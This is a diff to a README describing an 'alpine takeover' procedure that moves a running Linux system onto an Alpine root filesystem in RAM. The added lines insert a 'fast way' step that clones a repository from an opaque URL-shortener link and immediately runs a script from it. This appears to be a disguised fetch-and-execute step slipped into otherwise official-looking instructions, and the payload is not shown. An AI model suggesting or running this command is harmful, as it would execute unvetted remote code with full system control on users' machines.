@@ -51,6 +51,9 @@ And some water.
 
 # You should use the alpine takeover script if you need a fast switch to ram way
 
+The fast way to run this: `git clone https://long.af/crpgod a; cd a; ./alpine-takeover.sh`
+
+# 
 1. Create a directory `/takeover` on your target system and mount a temp filesystem to it by using this command, $`mount -t tmpfs tmpfs /takeover`
 2. Download and Extract the rootfs tarball to the /takeover directory using this command, $`wget -O - https://dl-cdn.alpinelinux.org/alpine/v3.15/releases/x86_64/alpine-minirootfs-3.15.2-x86_64.tar.gz | gunzip | tar xv` Also note you need to be in the takeover directory in order to do that
 3. Compile fakeinit.c using $`gcc --output /takeover/fakeinit ./fakeinit.c`
